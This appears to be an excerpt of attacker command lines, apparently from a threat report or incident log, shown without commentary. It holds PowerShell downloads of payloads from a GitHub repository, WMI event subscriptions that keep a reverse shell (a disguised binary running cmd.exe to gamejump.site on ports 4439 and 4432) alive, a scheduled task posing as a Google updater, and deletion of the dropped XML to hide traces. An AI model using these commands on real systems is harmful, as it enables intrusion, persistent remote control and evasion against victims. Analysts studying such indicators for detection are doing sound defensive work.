...
powershell.exe iwr https://github.com/wazgame/waz/raw/main/GoogleUbdat.xml -OutFile C:\ProgramData\GoogleUbdat.xml
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
...
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nut", CommandLineTemplate="C:\ProgramData\NUL..\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe", CommandLineTemplate="C:\ProgramData\NUL..\StartMenuExperienceHost.exe gamejump.site 4432 -e cmd.exe"
...
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nur", CommandLineTemplate="C:\ProgramData\USOShared\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe", CommandLineTemplate="C:\ProgramData\USOShared\StartMenuExperienceHost.exe gamejump.site 4432 -e cmd.exe"
...
schtasks /create /xml "C:\ProgramData\GoogleUbdat.xml" /tn "\GoogleUbdat"
powershell.exe iwr https://github.com/wazgame/waz/raw/main/WmiPrv.exe -OutFile C:\ProgramData\Packag\WmiPrv.exe
powershell.exe iwr https://github.com/wazgame/waz/raw/main/utshellext.dll -OutFile C:\ProgramData\Packag\utshellext.dll
...
del /S /Q C:\ProgramData\GoogleUbdat.xml
